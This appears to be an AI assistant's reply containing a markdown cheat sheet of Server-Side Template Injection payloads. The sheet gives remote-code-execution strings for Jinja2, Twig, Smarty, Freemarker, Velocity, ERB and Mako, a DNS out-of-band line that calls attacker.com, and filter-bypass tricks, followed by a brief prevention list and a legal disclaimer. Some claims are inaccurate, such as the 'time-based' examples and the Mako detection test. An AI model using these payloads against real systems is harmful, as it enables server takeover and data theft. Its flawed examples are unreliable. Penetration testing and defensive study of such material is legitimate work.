Here's a comprehensive **Server-Side Template Injection (SSTI)** payloads cheat sheet in a markdown file:

```markdown
# Server-Side Template Injection (SSTI) Payloads Cheat Sheet

Server-Side Template Injection (SSTI) occurs when an attacker injects malicious input into server-side templates, leading to remote code execution (RCE). Below is a collection of SSTI payloads for various template engines.

---

## **1. Basic Detection Payloads**
Test if the application is vulnerable to SSTI by injecting simple expressions:

### **Generic Detection**
```plaintext
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
${{7*7}}
#{7*7}
```

### **Mathematical Operations**
```plaintext
{{7*'7'}} → If output is '49' or '7777777', SSTI may exist
{{7*7}} → Expected output: 49
```

### **String Concatenation**
```plaintext
{{'a'+'b'}} → Expected: 'ab'
{{"a"+"b"}} → Expected: 'ab'
```

---

## **2. Template Engine Identification**
Different engines use different syntax. Identify the engine first:

| **Engine**       | **Test Payload**               | **Expected Output** |
|------------------|--------------------------------|---------------------|
| **Jinja2 (Python)** | `{{ 7*'7' }}` | `7777777` |
| **Twig (PHP)** | `{{ 7*7 }}` | `49` |
| **Smarty** | `{7*7}` | `49` |
| **Freemarker** | `${7*7}` | `49` |
| **Velocity** | `#set($x=7*7)${x}` | `49` |
| **ERB (Ruby)** | `<%= 7*7 %>` | `49` |
| **Handlebars** | `{{7*7}}` | Usually no output (safe by default) |
| **Mako (Python)** | `<% 7*7 %>` | `49` |

---

## **3. Exploitation Payloads**
Once the engine is identified, use these payloads for RCE.

### **Jinja2 (Python)**
```plaintext
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate() }}

{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

### **Twig (PHP)**
```plaintext
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{{ ['id']|filter('system') }}
```

### **Smarty (PHP)**
```plaintext
{php}echo shell_exec('id');{/php}

{system('id')}
```

### **Freemarker (Java)**
```plaintext
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### **Velocity (Java)**
```plaintext
#set($x='')${x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```

### **ERB (Ruby)**
```plaintext
<%= system("id") %>

<%= `id` %>
```

### **Mako (Python)**
```plaintext
<% import os %>${os.system('id')}
```

---

## **4. Blind SSTI Detection**
If no output is reflected, use time-based or out-of-band (OOB) techniques.

### **Time-Based Detection**
```plaintext
{% if 1 == 1 %}sleep 5{% endif %}  (Twig)
{{ range(1,100000000) }} (Jinja2 - may cause delay)
```

### **DNS Exfiltration (OOB)**
```plaintext
{{ ''.__class__.__mro__[1].__subclasses__()[407]('nslookup attacker.com', shell=True) }} (Jinja2)
```

---

## **5. Bypassing Filters**
If certain characters (`{{`, `}}`, `$`, etc.) are blocked, try:

### **Alternative Syntax**
```plaintext
{% raw %}{{ 7*7 }}{% endraw %} (Jinja2)
{# comment #} {{ 7*7 }} (Twig)
```

### **Hex/URL Encoding**
```plaintext
%7B%7B7*7%7D%7D → {{7*7}}
\x7B\x7B7*7\x7D\x7D → {{7*7}}
```

### **Concatenation Bypass**
```plaintext
{{ '{{' }}7*7{{ '}}' }} → {{7*7}}
```

---

## **6. Prevention & Mitigation**
1. **Use Sandboxed Templates** (e.g., Jinja2 sandbox mode).
2. **Disallow User-Supplied Templates** if possible.
3. **Whitelist Safe Functions** (no `eval`, `exec`, `os.system`).
4. **Input Validation** (block `{{`, `}}`, `$`, `<%`, etc.).
5. **Use Logic-less Templates** (e.g., Handlebars, Mustache).

---

## **7. Important Notes**
- **Legal & Ethical Use Only**: Unauthorized testing is illegal.
- **Always Get Permission**: Test only on authorized systems.
- **Avoid Destructive Payloads**: Use `id`, `whoami`, or `sleep` instead of `rm -rf`.

Use these payloads **responsibly** for security research and penetration testing.
```

### **Features of This Cheat Sheet**
✅ **Covers multiple template engines** (Jinja2, Twig, Smarty, Freemarker, etc.)  
✅ **Detection + Exploitation Payloads**  
✅ **Blind SSTI techniques** (time-based, OOB)  
✅ **Filter bypass methods**  
✅ **Prevention best practices**  

